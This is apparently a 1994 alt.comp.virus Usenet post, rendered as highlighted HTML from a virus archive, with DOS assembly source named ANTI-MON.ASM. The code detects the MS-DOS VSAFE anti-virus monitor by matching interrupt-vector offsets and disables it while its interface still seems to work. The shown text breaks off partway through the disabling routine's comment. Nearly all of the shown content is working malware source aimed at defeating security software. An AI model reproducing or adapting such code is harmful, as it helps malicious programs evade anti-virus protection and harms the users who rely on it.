<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Antimon.1450 - ANTI-MON.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">From</span><span class="sc0"> </span><span class="sc5">netcom.com</span><span class="sc0">!</span><span class="sc5">ix.netcom.com</span><span class="sc0">!</span><span class="sc5">netnews</span><span class="sc0"> </span><span class="sc5">Tue</span><span class="sc0"> </span><span class="sc5">Nov</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">:</span><span class="sc2">43</span><span class="sc4">:</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc2">1994</span><span class="sc0">
</span><span class="sc5">Xref</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">netcom.com</span><span class="sc0"> </span><span class="sc5">alt.comp.virus</span><span class="sc4">:</span><span class="sc2">507</span><span class="sc0">
</span><span class="sc5">Path</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">netcom.com</span><span class="sc0">!</span><span class="sc5">ix.netcom.com</span><span class="sc0">!</span><span class="sc5">netnews</span><span class="sc0">
</span><span class="sc5">From</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Zeppelin@ix.netcom.com</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Mr.</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Newsgroups</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">alt.comp.virus</span><span class="sc0">
</span><span class="sc5">Subject</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Anti</span><span class="sc0"> </span><span class="sc5">Monitor</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ANTI</span><span class="sc0"> </span><span class="sc5">AV</span><span class="sc0"> </span><span class="sc5">TSR</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Date</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0"> </span><span class="sc5">Nov</span><span class="sc0"> </span><span class="sc2">1994</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">:</span><span class="sc2">05</span><span class="sc4">:</span><span class="sc2">19</span><span class="sc0"> </span><span class="sc5">GMT</span><span class="sc0">
</span><span class="sc5">Organization</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Netcom</span><span class="sc0">
</span><span class="sc5">Lines</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc5">Distribution</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">world</span><span class="sc0">
</span><span class="sc5">Message</span><span class="sc4">-</span><span class="sc5">ID</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">3bf8uf</span><span class="sc5">$ib9@ixnews1.ix.netcom.com</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">References</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">sbringerD00yHv.Hs3@netcom.com</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">bradleymD011vJ.Lp8@netcom.com</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">NNTP</span><span class="sc4">-</span><span class="sc5">Posting</span><span class="sc4">-</span><span class="sc5">Host</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">ix</span><span class="sc4">-</span><span class="sc5">pas2</span><span class="sc4">-</span><span class="sc2">10.ix.netcom.com</span><span class="sc0">

</span><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc4">***********************</span><span class="sc0">
</span><span class="sc1">;*                                                                      </span><span class="sc0">
                      </span><span class="sc4">*</span><span class="sc0">
</span><span class="sc1">;*      FILE:     ANTI-MON.ASM (c) 1993                                 </span><span class="sc0">
                      </span><span class="sc4">*</span><span class="sc0">
</span><span class="sc1">;*      PURPOSE:  Detect and remove a TSR anti-viral monitor            </span><span class="sc0">
                      </span><span class="sc4">*</span><span class="sc0">
</span><span class="sc1">;*      AUTHOR:   Willoughby    DATE: 05/09/93                          </span><span class="sc0">
                      </span><span class="sc4">*</span><span class="sc0">
</span><span class="sc1">;*                                                                      </span><span class="sc0">
                      </span><span class="sc4">*</span><span class="sc0">
</span><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc4">***********************</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">MAIN</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">MAIN</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">MAIN</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100H</span><span class="sc0">

</span><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc4">***********************</span><span class="sc0">
</span><span class="sc1">;The purpose of this routine is simply to demonstrate the function of </span><span class="sc0">
</span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">FIND_AV_MON</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> 
</span><span class="sc1">;NEUT_AV_MON routines.  It displays a message based upon the results of </span><span class="sc0">
</span><span class="sc5">the</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">TSR</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc0">
</span><span class="sc1">;viral monitor interrupt vectors performed by the FIND_AV_MON routine </span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">action</span><span class="sc0"> </span><span class="sc5">taken</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0"> 
</span><span class="sc1">;needed, by the NEUT_AV_MON routine.  </span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FIND_AV_MON</span><span class="sc0">                     </span><span class="sc1">;check for installed </span><span class="sc0">
</span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">viral</span><span class="sc0"> </span><span class="sc5">monitors</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">MP1</span><span class="sc0">                             </span><span class="sc1">;if carry is set, a </span><span class="sc0">
</span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">present</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NOT_HERE_MSG</span><span class="sc0">          </span><span class="sc1">;if not, display </span><span class="sc0">
</span><span class="sc5">appropriate</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MPEX</span><span class="sc0">                            </span><span class="sc1">;during exit</span><span class="sc0">
</span><span class="sc5">MP1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MONITOR_TYPE</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;check for type/version </span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc5">present</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">MON0_HERE_MSG</span><span class="sc0"> 
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">MP2</span><span class="sc0">                             </span><span class="sc1">;if MONITOR_TYPE = 0, </span><span class="sc0">
</span><span class="sc5">display</span><span class="sc0"> </span><span class="sc5">v1.0</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">MON1_HERE_MSG</span><span class="sc0">         </span><span class="sc1">;otherwise, display v6.0 </span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0">
</span><span class="sc5">MP2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NEUT_AV_MON</span><span class="sc0">                     </span><span class="sc1">;then restore vectors to </span><span class="sc0">
</span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BUT_NOW_MSG</span><span class="sc0">           </span><span class="sc1">;display monitor removal </span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0">
</span><span class="sc5">MPEX</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00H</span><span class="sc0">                        </span><span class="sc1">;exit program</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">

</span><span class="sc5">NOT_HERE_MSG</span><span class="sc4">:</span><span class="sc0">   
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc12">'VSAFE is not present.'</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">
</span><span class="sc5">MON0_HERE_MSG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'VSAFE v1.0 is present.'</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">
</span><span class="sc5">MON1_HERE_MSG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'MS-DOS 6.0 VSAFE is present'</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">
</span><span class="sc5">BUT_NOW_MSG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc12">'But now, it just APPEARS to be.'</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">


</span><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc4">***********************</span><span class="sc0">
</span><span class="sc1">;This routine tests for the presence in memory of two versions of VSAFE </span><span class="sc0">
</span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">comparing</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> 
</span><span class="sc1">;offsets of the interrupt vectors stolen during VSAFE's installation </span><span class="sc0">
</span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">known</span><span class="sc0"> </span><span class="sc5">VSAFE</span><span class="sc0"> </span><span class="sc5">interrupt</span><span class="sc0"> 
</span><span class="sc1">;handler offsets.  When it finds any three offset values in the system </span><span class="sc0">
</span><span class="sc5">interrupt</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> 
</span><span class="sc1">;which match the VSAFE offsets for the corresponding interrupt, the </span><span class="sc0">
</span><span class="sc5">carry</span><span class="sc0"> </span><span class="sc5">flag</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">set</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> 
</span><span class="sc1">;indicate the presence of VSAFE in memory to the calling routine.  The </span><span class="sc0">
</span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0"> </span><span class="sc5">VSAFE</span><span class="sc0"> 
</span><span class="sc1">;resides is stored in MONITOR_SEGMENT and the VSAFE version stored in </span><span class="sc0">
</span><span class="sc5">MONITOR_TYPE</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">use</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> 
</span><span class="sc1">;the NEUT_AV_MON routine. </span><span class="sc0">

</span><span class="sc5">NUM_MONITORS</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">;# of anti-viral monitor </span><span class="sc0">
</span><span class="sc5">types</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0">
</span><span class="sc5">NUM_VECTORS</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;# of interrupt vector </span><span class="sc0">
</span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">
</span><span class="sc5">MATCHES_REQ</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;# of offset matches </span><span class="sc0">
</span><span class="sc5">required</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">positive</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc0">

</span><span class="sc5">FIND_AV_MON</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;set ES to segment of </span><span class="sc0">
</span><span class="sc5">interrupt</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NUM_VECTORS</span><span class="sc0">                  </span><span class="sc1">;set loop counter to # </span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">vectors</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VECTOR_OFFSETS</span><span class="sc0">        </span><span class="sc1">;point SI to start of </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0">
</span><span class="sc5">FAMLP1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;load vector table </span><span class="sc0">
</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">w</span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;load offset of vector </span><span class="sc0">
</span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                          
</span><span class="sc5">FAMLP2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;load offset value used </span><span class="sc0">
</span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">viral</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">                       </span><span class="sc1">;test for skip vector </span><span class="sc0">
</span><span class="sc5">check</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FAMLP3</span><span class="sc0">                          </span><span class="sc1">;if skip value (FFFFH), </span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc0"> </span><span class="sc5">inner</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;does vector table value </span><span class="sc0">
</span><span class="sc5">match</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc5">value?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FAMLP3</span><span class="sc0">                                          </span><span class="sc1">;if not, </span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TOTAL_MATCHES</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;if so, </span><span class="sc0">
</span><span class="sc5">increment</span><span class="sc0"> </span><span class="sc5">match</span><span class="sc0"> </span><span class="sc5">counter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TOTAL_MATCHES</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc5">MATCHES_REQ</span><span class="sc0">  
</span><span class="sc1">;required # of matches found?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FAMLP3</span><span class="sc0">                                          </span><span class="sc1">;if not, </span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;set BX to point at </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;load anti-viral seg. </span><span class="sc0">
</span><span class="sc5">value</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MONITOR_SEGMENT</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;store segment value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MONITOR_TYPE</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                 </span><span class="sc1">;store monitor number </span><span class="sc0">
</span><span class="sc5">indicating</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc4">/</span><span class="sc9">type</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">;set carry flag to </span><span class="sc0">
</span><span class="sc5">indicate</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FAMEX</span><span class="sc0">                           
</span><span class="sc5">FAMLP3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;increment monitor </span><span class="sc0">
</span><span class="sc5">number</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">NUM_MONITORS</span><span class="sc0">                 </span><span class="sc1">;all monitor values </span><span class="sc0">
</span><span class="sc5">checked</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">vector?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FAMLP2</span><span class="sc0">                          </span><span class="sc1">;if not, do it all again</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">FAMLP1</span><span class="sc0">                          </span><span class="sc1">;if all vectors not </span><span class="sc0">
</span><span class="sc5">checked</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;clear carry flag to </span><span class="sc0">
</span><span class="sc5">indicate</span><span class="sc0"> </span><span class="sc5">no</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0">
</span><span class="sc5">FAMEX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     

</span><span class="sc5">MONITOR_SEGMENT</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;storage location for </span><span class="sc0">
</span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
</span><span class="sc5">MONITOR_TYPE</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;ditto for monitor type</span><span class="sc0">

</span><span class="sc5">TOTAL_MATCHES</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">NUM_MONITORS</span><span class="sc0">    </span><span class="sc9">DUP</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;table for </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">match</span><span class="sc0"> </span><span class="sc5">counts</span><span class="sc0">

</span><span class="sc5">VECTOR_OFFSETS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">004CH</span><span class="sc4">,</span><span class="sc2">1039H</span><span class="sc4">,</span><span class="sc2">0352H</span><span class="sc0">               </span><span class="sc1">;INT 13H, VSAFE1 offset, </span><span class="sc0">
</span><span class="sc5">VSAFE6</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0058H</span><span class="sc4">,</span><span class="sc2">12CDH</span><span class="sc4">,</span><span class="sc2">05DDH</span><span class="sc0">               </span><span class="sc1">;INT 16H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0080H</span><span class="sc4">,</span><span class="sc2">138CH</span><span class="sc4">,</span><span class="sc2">06BCH</span><span class="sc0">               </span><span class="sc1">;INT 20H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0084H</span><span class="sc4">,</span><span class="sc2">15F7H</span><span class="sc4">,</span><span class="sc2">0940H</span><span class="sc0">               </span><span class="sc1">;INT 21H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">009CH</span><span class="sc4">,</span><span class="sc2">1887H</span><span class="sc4">,</span><span class="sc2">0C0CH</span><span class="sc0">               </span><span class="sc1">;INT 27H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">00BCH</span><span class="sc4">,</span><span class="sc2">2476H</span><span class="sc4">,</span><span class="sc2">1440H</span><span class="sc0">               </span><span class="sc1">;INT 2FH</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0100H</span><span class="sc4">,</span><span class="sc2">1254H</span><span class="sc4">,</span><span class="sc2">05CBH</span><span class="sc0">               </span><span class="sc1">;INT 40H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0024H</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc4">,</span><span class="sc2">02AFH</span><span class="sc0">              </span><span class="sc1">;INT 09H (FFFFH = skip </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc4">***********************</span><span class="sc0">
</span><span class="sc1">;This routine restores all but the keyboard interrupt vectors to their </span><span class="sc0">
</span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0"> </span><span class="sc5">prior</span><span class="sc0"> 
</span><span class="sc1">;to the residency of VSAFE.  This is accomplished by moving the </span><span class="sc0">
</span><span class="sc5">original</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">unencrypted</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">!</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> 
</span><span class="sc1">;vector values stored within VSAFE to their respective locations in the </span><span class="sc0">
</span><span class="sc5">system</span><span class="sc0"> </span><span class="sc5">interrupt</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> 
</span><span class="sc1">;table.  VSAFE is, thereby, completely disabled, but appears to be fully </span><span class="sc0">
</span><span class="sc5">functional</span><span class="sc0"> </span><span class="sc5">because</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> 
</span><span class="sc1">;user interface continues to respond correctly to user inputs.  This </span><span class="sc0">
</span><span class="sc5">routine</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0"> 
</span><span class="sc1">;segment (MONITOR_SEGMENT) and monitor type/version (MONITOR_TYPE) </span><span class="sc0">
</span><span class="sc5">values</span><span class="sc0"> </span><span class="sc5">returned</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
